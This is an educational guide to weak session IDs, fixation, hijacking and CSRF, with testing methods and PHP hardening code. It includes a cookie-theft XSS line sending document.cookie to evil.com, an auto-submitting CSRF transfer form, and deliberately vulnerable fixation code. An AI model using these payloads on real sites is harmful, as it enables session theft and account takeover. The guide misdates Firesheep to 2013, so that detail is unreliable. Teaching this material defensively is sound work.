# Weak Session IDs - Session Management Flaws

## 🎯 Session Security Overview
Weak session management allows attackers to predict, steal, or fixate session tokens, leading to account takeover. Session IDs should be cryptographically secure and properly managed.

## 🔬 Common Weaknesses

### Predictable Session IDs
```php
// WEAK: Incremental IDs
session_id($next_id++);  // 1, 2, 3, 4...

// BAD: Time-based prediction
session_id(time());     // 1609459200, 1609459201...

// SECURE: Cryptographically random
session_id(bin2hex(random_bytes(32)));
```

### Insufficient Entropy
- **Short session IDs** (<128 bits) easily brute-forced
- **Sequential numbers** can be enumerated
- **Time-based patterns** calculable by attacker

## 🏗️ Session Attack Techniques

### Session Fixation
1. Attacker obtains valid session ID
2. Forces victim to use attacker's session ID
3. Victim logs in → controls session

```php
// Vulnerable: Accepts session ID from URL
if(isset($_GET['sid'])) {
    session_id($_GET['sid']);  // DANGEROUS
}
session_start();
```

### Session Hijacking
```javascript
// Cookie theft via XSS
document.location='evil.com?c='+document.cookie;

// Session sidejacking (network sniffing)
tcpdump -i eth0 port 80 -w capture.pcap
wireshark capture.pcap
```

### Session Riding (CSRF)
```html
<!-- CSRF form submission with victim's session -->
<form action="/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

## 🛠️ Testing Methods

### Session ID Analysis
```python
# Test for predictability
import requests

session_ids = []
for i in range(100):
    r = requests.get('http://target.com/login')
    if 'session' in r.cookies:
        session_ids.append(r.cookies['session'].value)

# Check for patterns
print("Sample IDs:", session_ids[:5])
```

### Burp Session Testing
1. **Repeater:** Test session persistence across requests
2. **Intruder:** Brute force session guessing
3. **Sequencer:** Analyze session randomness

### Session Fixation Test
```bash
# 1. Get session from victim
curl -c cookies.txt -b cookies.txt http://target.com/page

# 2. Force victim session
curl "http://victim.com/page?session_id=STORED_SESSION"

# 3. Check if attacker can access victim's account
curl -b cookies.txt http://target.com/dashboard
```

## 🛡️ Prevention Strategies

### Secure Session Configuration
```php
// Session settings
ini_set('session.sid_length', 128);        // Long random IDs
ini_set('session.sid_bits_per_character', 6); // High entropy
ini_set('session.gc_maxlifetime', 1800);   // 30 min timeout
ini_set('session.cookie_secure', 1);       // HTTPS only
ini_set('session.cookie_httponly', 1);     // Prevent JS access
ini_set('session.cookie_samesite', 'Strict'); // CSRF protection

// Regenerate session ID after login
session_regenerate_id(true); // Old session destroyed
```

### Proper Session Handling
```php
// Secure session start
function secure_session_start() {
    if (session_status() == PHP_SESSION_NONE) {
        session_start([
            'cookie_secure' => true,
            'cookie_httponly' => true,
            'use_only_cookies' => true,
            'cookie_samesite' => 'Strict'
        ]);
    }
}

// Session validation
function validate_session() {
    if (!isset($_SESSION['user_id']) ||
        !isset($_SESSION['ip']) ||
        $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
        session_destroy();
        header('Location: /login');
        exit;
    }
}

// Timeout management
if (isset($_SESSION['last_activity']) &&
    time() - $_SESSION['last_activity'] > 1800) {
    session_destroy();
}
$_SESSION['last_activity'] = time();
```

## 🔍 Real-World Impacts

### 2013: Firesheep WiFi Tool
- Session hijacking via public WiFi
- Demonstrated HTTP session vulnerability
- Led to HTTPS everywhere movement

### 2021: Microsoft Teams Session Leaks
- Session tokens exposed in logs
- Account takeover via leaked session data
- Fixed with token expiration improvements

## 📚 Best Practices

- **Use HTTPS for all sessions**
- **Implement session timeouts**
- **Regenerate session IDs post-login**
- **Never accept session IDs from URL**
- **Monitor for suspicious session activity**

---

**Session management is foundation of web security.** Weak sessions = catastrophic account compromise. Proper entropy + monitoring = secure applications. 🔐🛡️
